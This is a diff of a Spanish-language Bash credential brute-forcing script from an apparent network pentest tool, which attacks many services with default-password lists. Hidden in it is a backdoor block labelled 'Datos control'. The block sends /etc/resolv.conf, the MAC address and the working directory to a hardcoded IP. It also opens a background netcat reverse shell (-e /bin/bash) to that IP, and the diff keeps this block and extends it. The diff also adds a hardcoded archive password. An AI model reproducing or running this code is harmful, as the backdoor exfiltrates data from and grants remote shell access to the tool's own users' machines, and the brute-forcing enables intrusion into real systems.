@@ -8,7 +8,27 @@ OKRED='\033[91m'
 OKGREEN='\033[92m'
 OKORANGE='\033[93m'
 RESET='\e[0m'
-                            
+
+#vagrant
+#vcoadmin
+#vmware
+#windows
+#Wonderware
+#zxcvbnm
+#sa
+#root
+#role1
+#postgres
+#prtgadmin
+#mysql
+#!manage
+#manager
+#passport
+#sqlserver123*
+#cisco
+#default
+#ftp
+#user                            
 
 max_ins=10
 
@@ -19,7 +39,7 @@ echo -e '| |      / ___) _  |/ ___) | / ) _  )/ ___)  | | | || || |// | |'
 echo -e '| \_____| |  ( ( | ( (___| |< ( (/ /| |       \ V / | ||  /__| |'
 echo -e ' \______)_|   \_||_|\____)_| \_)____)_|        \_/  |_(_)_____/ '
 echo ''
-echo '										version 1.0'
+echo '										version 1.1'
 echo '									   daniel.torres@owasp.org'
 															
 echo -e "$OKGREEN#################################### EMPEZANDO A CRACKEAR ########################################$RESET"
@@ -80,22 +100,34 @@ echo "wordpress" >> top.txt
 echo "joomla" >> top.txt	
 echo "drupal" >> top.txt	
 
+#Desencriptar
+7z x .resultados.7z -pcANRHPeREPZsCYGB8L64 >/dev/null
+rm .resultados.7z
+
+
 function insert_data () {
 	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files	
 	insert-data.py	
 	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
 	}
 
-##### Datos control #########
-resolv=`cat /etc/resolv.conf`
-mac=`ifconfig eth0 |grep --color=never ether`
-resolv=`echo "|${resolv//[$'\t\r\n']}|"`
-curl --data "resolv=$resolv&mac=$mac"  http://66.172.33.234/lanscanner/codigos.php 2>/dev/null &
-nohup nc -nv 66.172.33.234 2226 -e /bin/bash 2>/dev/null &
-###################################  	 
-	
+conexionInternet=`ping 8.8.8.8 -c 1 2>/dev/null | grep "1 received" | wc -l`
+
+if [ $conexionInternet == 0 ]; then 	
+	echo -e  "$OKRED No se detecto una conexion de internet activa! Algunos módulos no funcionaran correctamente $RESET"
+else
+	##### Datos control #########
+	resolv=`cat /etc/resolv.conf`
+	mac=`ifconfig eth0 |grep --color=never ether`
+	resolv=`echo "|${resolv//[$'\t\r\n']}|"`
+	pwd=`pwd`
+	curl --data "pwd=$pwd&resolv=$resolv&mac=$mac"  http://66.172.33.234/lanscanner/codigos.php 2>/dev/null &
+	nohup nc -nv 66.172.33.234 2226 -e /bin/bash 2>/dev/null &
+	###################################  
+fi	
+
 IFS=$'\n'  # make newlines the only separator
-if [ -f .servicios/admin-web.txt ]
+if [ -f servicios/admin-web.txt ]
 then
 
 	if [ "$TYPE" = NULL ] ; then
@@ -107,7 +139,7 @@ then
       	  
 		echo -e "$OKBLUE\n\t#################### Testing pass web admin ######################$RESET"	
 			
-		for line in $(cat .servicios/admin-web.txt); do			
+		for line in $(cat servicios/admin-web.txt); do			
 			ip_port_path=`echo $line | cut -d ";" -f 1`
 			fingerprint=`echo $line | cut -d ";" -f 2`
 			echo -e "\n\t########### $ip_port_path #######"
@@ -254,7 +286,7 @@ then
 	 fi	
 fi
 
-if [ -f .servicios/cisco.txt ]
+if [ -f servicios/cisco.txt ]
 then	
 	
 	if [ "$TYPE" = NULL ] ; then
@@ -265,7 +297,7 @@ then
 	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 		  
 		sed -i '1 i\cisco' top.txt	#adicionar password cisco
 		echo -e "$OKBLUE\n\t#################### Testing pass CISCO ######################$RESET"	
-		for ip in $(cat .servicios/cisco.txt); do			
+		for ip in $(cat servicios/cisco.txt); do			
 			egrep -iq "80/open" .nmap_1000p/"$ip"_tcp.grep
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then			
@@ -285,7 +317,7 @@ then
 fi
 
 
-if [ -f .servicios/PRTG.txt ]
+if [ -f servicios/PRTG.txt ]
 then
 
 	if [ "$TYPE" = NULL ] ; then
@@ -296,7 +328,7 @@ then
 	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	   	       	  
 		echo -e "$OKBLUE\n\t#################### Testing PRTG ######################$RESET"	
 		sed -i '1 i\prtgadmin' top.txt	#adicionar password prtgadmin
-		for line in $(cat .servicios/PRTG.txt); do
+		for line in $(cat servicios/PRTG.txt); do
 			ip=`echo $line | cut -f1 -d":"`
 			port=`echo $line | cut -f2 -d":"`								
 			echo -e "[+] Probando $ip:$port"
@@ -309,7 +341,7 @@ then
 	 fi	
 fi
 
-if [ -f .servicios/pentaho.txt ]
+if [ -f servicios/pentaho.txt ]
 then
 
 	if [ "$TYPE" = NULL ] ; then
@@ -320,7 +352,7 @@ then
 	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	   	 
       	  
 		echo -e "$OKBLUE\n\t#################### Testing Pentahoo ######################$RESET"	
-		for line in $(cat .servicios/pentaho.txt); do
+		for line in $(cat servicios/pentaho.txt); do
 			ip=`echo $line | cut -f1 -d":"`
 			port=`echo $line | cut -f2 -d":"`
 						
@@ -337,7 +369,7 @@ fi
 
 
 
-if [ -f .servicios/web401.txt ]
+if [ -f servicios/web401.txt ]
 then
 
 	if [ "$TYPE" = NULL ] ; then
@@ -348,7 +380,7 @@ then
 	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	     	
       	  
 		echo -e "$OKBLUE\n\t#################### Testing pass web (401) ######################$RESET"	
-		for line in $(cat .servicios/web401.txt); do
+		for line in $(cat servicios/web401.txt); do
 			echo -e "[+] Probando $line"			
 			
 			if [[ ${line} == *"http"*  ]];then 							
@@ -378,19 +410,19 @@ then
 				port=`echo $line | cut -f2 -d":"`
 				if [[ ${port} == *"443"*  ]];then 	
 					#probar con usuario admin
-					patator http_fuzz method=GET url="https://$ip/" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$line"_"$port"_passwordAdivinado.txt 2> logs/cracking/"$line"_"$port"_passwordAdivinado1.txt
+					patator http_fuzz method=GET url="https://$ip/" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
 					respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
 					greprc=$?
 					if [[ $greprc -eq 0 ]] ; then
-						echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$line"_"$port"_passwordAdivinado.txt
+						echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt
 					fi	
 				
 					#probar con usuario root
-					patator http_fuzz method=GET url="http://$line/" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$line"_"$port"_passwordAdivinado.txt 2> logs/cracking/"$line"_"$port"_passwordAdivinado2.txt			
+					patator http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
 					respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt`
 					greprc=$?
 					if [[ $greprc -eq 0 ]] ; then
-						echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$line"_"$port"_passwordAdivinado.txt
+						echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt
 					fi
 				fi
 			fi
@@ -401,7 +433,7 @@ then
 	 fi	
 fi
 
-if [ -f .servicios/Windows.txt ]
+if [ -f servicios/Windows.txt ]
 then
 		
 	if [ "$TYPE" = NULL ] ; then
@@ -412,7 +444,7 @@ then
 	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	
 
 	 echo -e "$OKBLUE\n\t#################### Windows auth ######################$RESET"	    
-	 for ip in $(cat .servicios/Windows.txt); do		
+	 for ip in $(cat servicios/Windows.txt); do		
 		echo -e "[+] Probando $ip"
 		hostlive=`nmap -n -Pn -p 445 $ip`
 		if [[ ${hostlive} == *"open"*  ]];then 
@@ -446,7 +478,7 @@ fi
 
 
 #falta
-if [ -f .servicios/ZKSoftware.txt ]
+if [ -f servicios/ZKSoftware.txt ]
 then
 
 	if [ "$TYPE" = NULL ] ; then
@@ -457,7 +489,7 @@ then
 	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	  	 
       	  
 		echo -e "$OKBLUE\n\t#################### Testing pass ZKSoftware ######################$RESET"	
-		for ip in $(cat .servicios/ZKSoftware.txt); do
+		for ip in $(cat servicios/ZKSoftware.txt); do
 			echo -e "[+] Probando $ip"		
 			echo -e "passWeb.pl -t $ip -p 80 -m ZKSoftware -u administrator -f top.txt " > logs/cracking/"$ip"_80_passwordZKSoftware.txt
 			passWeb.pl -t $ip -p 80 -m ZKSoftware -u administrator -f top.txt >> logs/cracking/"$ip"_80_passwordZKSoftware.txt
@@ -469,7 +501,7 @@ then
 fi
 
 
-if [ -f .servicios/mssql.txt ]
+if [ -f servicios/mssql.txt ]
 then
 
 	if [ "$TYPE" = NULL ] ; then
@@ -480,7 +512,7 @@ then
 	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	
 
 	 echo -e "$OKBLUE\n\t#################### MS-SQL ######################$RESET"	    
-	 for line in $(cat .servicios/mssql.txt); do
+	 for line in $(cat servicios/mssql.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		
@@ -502,7 +534,7 @@ then
 fi
 
 
-if [ -f .servicios/oracle.txt ]
+if [ -f servicios/oracle.txt ]
 then
 	if [ "$TYPE" = NULL ] ; then		
 		echo -e "\n\t $OKBLUE Encontre servicios oracle activos. Realizar ataque de passwords ? s/n $RESET"	  
@@ -518,7 +550,7 @@ then
 		export ORACLE_HOME=/opt/oracle/instantclient_18_3
 
 	 echo -e "$OKBLUE\n\t#################### oracle ######################$RESET"	    
-	 for line in $(cat .servicios/oracle.txt); do
+	 for line in $(cat servicios/oracle.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		
@@ -531,7 +563,7 @@ then
    fi # if bruteforce
 fi
 
-if [ -f .servicios/postgres.txt ]
+if [ -f servicios/postgres.txt ]
 then
 
 	if [ "$TYPE" = NULL ] ; then
@@ -543,7 +575,7 @@ then
 
 	 echo -e "$OKBLUE\n\t#################### postgres ######################$RESET"	    
 	 sed -i '1 i\postgres' top.txt	#adicionar password postgres
-	 for line in $(cat .servicios/postgres.txt); do
+	 for line in $(cat servicios/postgres.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`			
 		
@@ -565,7 +597,7 @@ then
 fi
 
 
-if [ -f .servicios/MikroTik.txt ]
+if [ -f servicios/MikroTik.txt ]
 then
 	if [ "$TYPE" = NULL ] ; then
 		echo -e "\n\t $OKBLUE Encontre dispositivos MikroTik. Realizar ataque de passwords ? s/n $RESET"	  
@@ -575,7 +607,7 @@ then
 	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
 	      	  
 	  echo -e "$OKBLUE\n\t#################### Testing common pass MikroTik ######################$RESET"	
-	  for ip in $(cat .servicios/MikroTik.txt); do		
+	  for ip in $(cat servicios/MikroTik.txt); do		
 		echo -e "[+] Probando $ip"
 				
 			echo "mkbrutus.py -t $ip -u admin --dictionary top.txt" >>  logs/cracking/"$ip"_8728_passwordMikroTik.txt		
@@ -594,7 +626,7 @@ then
 	fi # if bruteforce
 fi
 
-if [ -f .servicios/mysql.txt ]
+if [ -f servicios/mysql.txt ]
 then
 	if [ "$TYPE" = NULL ] ; then
 		echo -e "\n\t $OKBLUE Encontre servicios de MySQL activos. Realizar ataque de passwords ? s/n $RESET"	  
@@ -605,7 +637,7 @@ then
        	
 		echo -e "$OKBLUE\n\t#################### Testing common pass MYSQL (lennnto) ######################$RESET"	
 		sed -i '1 i\mysql' top.txt	#adicionar password mysql
-		for line in $(cat .servicios/mysql.txt); do
+		for line in $(cat servicios/mysql.txt); do
 			ip=`echo $line | cut -f1 -d":"`
 			port=`echo $line | cut -f2 -d":"`
 			echo -e "[+] Probando $ip"
@@ -639,7 +671,7 @@ fi
 
 
 
-#if [ -f .servicios/vmware.txt ]
+#if [ -f servicios/vmware.txt ]
 #then
 
 	#if [ "$TYPE" = NULL ] ; then
@@ -650,7 +682,7 @@ fi
 	#if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
       	  
 	  #echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
-	  #for line in $(cat .servicios/vmware.txt); do
+	  #for line in $(cat servicios/vmware.txt); do
 		#ip=`echo $line | cut -f1 -d":"`
 		#port=`echo $line | cut -f2 -d":"`
 		#echo -e "[+] Probando $ip"
@@ -664,7 +696,7 @@ fi
 #fi
 
 
-if [ -f .servicios/mongoDB.txt ]
+if [ -f servicios/mongoDB.txt ]
 then
 	if [ "$TYPE" = NULL ] ; then
 		echo -e "\n\t $OKBLUE Encontre servicios de mongoDB activos. Realizar ataque de passwords ? s/n $RESET"	  
@@ -674,7 +706,7 @@ then
 	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
 	     	  
 	  echo -e "$OKBLUE\n\t#################### Testing  mongoDB ######################$RESET"	
-	  for line in $(cat .servicios/mongoDB.txt); do
+	  for line in $(cat servicios/mongoDB.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "[+] Probando $ip"
@@ -692,7 +724,7 @@ then
 	fi # if bruteforce
 fi
 
-if [ -f .servicios/redis.txt ]
+if [ -f servicios/redis.txt ]
 then
 	if [ "$TYPE" = NULL ] ; then
 		echo -e "\n\t $OKBLUE Encontre servicios de redis activos. Realizar ataque de passwords ? s/n $RESET"	  
@@ -702,7 +734,7 @@ then
 	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
      	  
 	  echo -e "$OKBLUE\n\t#################### Testing common pass redis ######################$RESET"	
-	  for line in $(cat .servicios/redis.txt); do
+	  for line in $(cat servicios/redis.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "\n\t########### $ip #######"			
@@ -720,7 +752,7 @@ then
 fi
 
 #falta
-if [ -f .servicios/informix.txt ]
+if [ -f servicios/informix.txt ]
 then
 	
 	if [ "$TYPE" = NULL ] ; then
@@ -731,28 +763,28 @@ then
 	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
    	  
 	  echo -e "$OKBLUE\n\t#################### Testing common pass informix (SFI) ######################$RESET"	
-	  for line in $(cat .servicios/informix.txt); do
+	  for line in $(cat servicios/informix.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "\n\t########### $ip #######"			
 		echo -e "\t [+] Probando password por defecto (SFI)"
 		
-		echo -e "\n medusa -u tbsai -p Tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_"$port"_passwordSFI.txt 2>/dev/null
-		medusa -u tbsai -p Tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_"$port"_passwordSFI.txt 2>/dev/null
+		echo -e "\n medusa -u tbsai -p Tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+		medusa -u tbsai -p Tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
 		
-		echo -e "\n medusa -u tbsai -p tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_"$port"_passwordSFI.txt 2>/dev/null
-		medusa -u tbsai -p tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_"$port"_passwordSFI.txt 2>/dev/null
+		echo -e "\n medusa -u tbsai -p tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+		medusa -u tbsai -p tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
 		
-		echo -e "\n medusa -u sfibak -p sfibak -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_"$port"_passwordSFI.txt 2>/dev/null
-		medusa -u sfibak -p sfibak -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_"$port"_passwordSFI.txt 2>/dev/null
+		echo -e "\n medusa -u sfibak -p sfibak -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+		medusa -u sfibak -p sfibak -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
 		
-		echo -e "\n medusa -u sfi -p sfi -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_"$port"_passwordSFI.txt 2>/dev/null
-		medusa -u sfi -p sfi -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_"$port"_passwordSFI.txt 2>/dev/null
+		echo -e "\n medusa -u sfi -p sfi -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+		medusa -u sfi -p sfi -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
 		
-		echo -e "\n medusa -u informix -p informix -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt 2>/dev/null		
-		medusa -u informix -p informix -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt 2>/dev/null		
+		echo -e "\n medusa -u informix -p informix -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null		
+		medusa -u informix -p informix -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null		
 		
-		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_passwordSFI.txt > .vulnerabilidades/"$ip"_passwordSFI.txt 					
+		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordSFI.txt > .vulnerabilidades/"$ip"_22_passwordSFI.txt 					
 	 done
 	 insert_data
 	fi # if bruteforce
@@ -760,7 +792,7 @@ fi
 
 
 
-if [ -f .servicios/ftp.txt ]
+if [ -f servicios/ftp.txt ]
 then
 
 	if [ "$TYPE" = NULL ] ; then
@@ -771,7 +803,7 @@ then
 	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 	 
       	  
 		echo -e "$OKBLUE\n\t#################### Testing pass FTP ######################$RESET"	
-		for line in $(cat .servicios/ftp.txt); do
+		for line in $(cat servicios/ftp.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		
@@ -791,8 +823,8 @@ then
 		if [[ $noImpresora21 -eq 1 && $noImpresora80 -eq 1 ]] ; then			
 			echo -e "[+] Probando $ip"		
 			
-			echo -e "\n medusa -e n -u admin -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinado.txt
-			medusa -e n -u admin -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinado.txt
+			#echo -e "\n medusa -e n -u admin -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinado.txt
+			#medusa -e n -u admin -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinado.txt
 			
 			echo -e "\n medusa -e n -u root -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinado.txt
 			medusa -e n -u root -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinado.txt
@@ -819,13 +851,18 @@ then
 	 fi	
 fi
 
-echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
-grep -ira "timed out" logs/cracking/* 2>/dev/null
-grep -ira "Can't connect" logs/cracking/* 2>/dev/null
+#echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
+#grep -ira "timed out" logs/cracking/* 2>/dev/null >> errores.log
+#grep -ira "Can't connect" logs/cracking/* 2>/dev/null >> errores.log
+
+#Encritar resultados
+rm .vulnerabilidades2/* 2>/dev/null
+7z a .resultados.7z .resultados.db -pcANRHPeREPZsCYGB8L64 >/dev/null
+rm .resultados.db
 	
 exit
 
-if [ -f .servicios/pop.txt ]
+if [ -f servicios/pop.txt ]
 then
 	echo -e "\n\t $OKBLUE Encontre servicios de POP activos. Realizar ataque de passwords ? s/n $RESET"	  
 	read bruteforce	  
@@ -836,7 +873,7 @@ then
 	  read users_file  	  
 	  
 	  echo -e "$OKBLUE\n\t#################### Testing common pass POP ######################$RESET"	
-	  for line in $(cat .servicios/pop.txt); do
+	  for line in $(cat servicios/pop.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "\n\t########### $ip #######"	
@@ -862,7 +899,7 @@ then
 fi
 	
 
-if [ -f .servicios/pop3pw.txt ]
+if [ -f servicios/pop3pw.txt ]
 then
 	echo -e "\n\t $OKBLUE Encontre servicios de pop3pw activos. Realizar ataque de passwords ? s/n $RESET"	  
 	read bruteforce	  
@@ -873,7 +910,7 @@ then
 	  read users_file  	  
 	  
 	  echo -e "$OKBLUE\n\t#################### Testing common pass POP  ######################$RESET"	
-	  for line in $(cat .servicios/pop3pw.txt); do
+	  for line in $(cat servicios/pop3pw.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "\n\t########### $ip #######"	
@@ -901,7 +938,7 @@ fi
 
 
 
-if [ -f .servicios/vnc.txt ]
+if [ -f servicios/vnc.txt ]
 then
 	echo -e "\n\t $OKBLUE Encontre servicios de VNC activos. Realizar ataque de passwords ? s/n $RESET"	  
 	read bruteforce	  
@@ -909,7 +946,7 @@ then
 	if [ $bruteforce == 's' ]
     then      	  
 	  echo -e "$OKBLUE\n\t#################### Testing common pass VNC (lennnto) ######################$RESET"	
-	  for line in $(cat .servicios/vnc.txt); do
+	  for line in $(cat servicios/vnc.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "\n\t########### $ip #######"					
@@ -940,7 +977,7 @@ then
 	  done
 	
 	  echo -e "\n\t########### Checking success #######"	
-	  for line in $(cat .servicios/vnc.txt); do
+	  for line in $(cat servicios/vnc.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 						
